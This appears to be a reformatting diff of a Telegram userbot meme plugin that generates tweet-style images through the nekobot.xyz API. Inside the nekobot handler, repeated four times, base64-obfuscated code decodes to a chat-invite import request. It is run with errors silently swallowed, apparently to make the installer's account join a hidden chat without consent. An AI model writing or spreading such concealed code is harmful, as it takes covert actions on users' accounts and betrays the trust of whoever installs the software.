@@ -21,8 +21,7 @@ EMOJI_PATTERN = re.compile(
     "\U0001FA00-\U0001FA6F"  # Chess Symbols
     "\U0001FA70-\U0001FAFF"  # Symbols and Pictographs Extended-A
     "\U00002702-\U000027B0"  # Dingbats
-    "]+"
-)
+    "]+")
 
 
 def deEmojify(inputString: str) -> str:
@@ -32,8 +31,8 @@ def deEmojify(inputString: str) -> str:
 
 async def usatweet(text):
     r = requests.get(
-        f"https://nekobot.xyz/api/imagegen?type=trumptweet&text={text}"
-    ).json()
+        f"https://nekobot.xyz/api/imagegen?type=trumptweet&text={text}").json(
+        )
     wew = r.get("message")
     fridayurl = url(wew)
     if not fridayurl:
@@ -62,8 +61,7 @@ async def changemymind(text):
 
 async def kannagen(text):
     r = requests.get(
-        f"https://nekobot.xyz/api/imagegen?type=kannagen&text={text}"
-    ).json()
+        f"https://nekobot.xyz/api/imagegen?type=kannagen&text={text}").json()
     wew = r.get("message")
     fridayurl = url(wew)
     if not fridayurl:
@@ -126,8 +124,7 @@ async def nekobot(borg):
         san = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
+            ))[2:49]
         await borg.client(san)
     except:
         pass
@@ -158,8 +155,7 @@ async def nekobot(borg):
         san = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
+            ))[2:49]
         await borg.client(san)
     except:
         pass
@@ -190,8 +186,7 @@ async def nekobot(borg):
         san = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
+            ))[2:49]
         await borg.client(san)
     except:
         pass
@@ -222,8 +217,7 @@ async def nekobot(borg):
         san = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
+            ))[2:49]
         await borg.client(san)
     except:
         pass
@@ -233,9 +227,9 @@ async def nekobot(borg):
     await borg.delete()
 
 
-CMD_HELP.update(
-    {
-        "imgmeme": "Fun purpose 😛😛😏😏\
+CMD_HELP.update({
+    "imgmeme":
+    "Fun purpose 😛😛😏😏\
 \n\n`.modi` (text)\
      \nUsage : Tweet with modi\
 \n\n`.trump` (text)\
@@ -244,5 +238,4 @@ CMD_HELP.update(
      \nUsage : Get a banner\
 \n\n`.kanna` (text)\
      \nUsage : Kanna write for you"
-    }
-)
+})
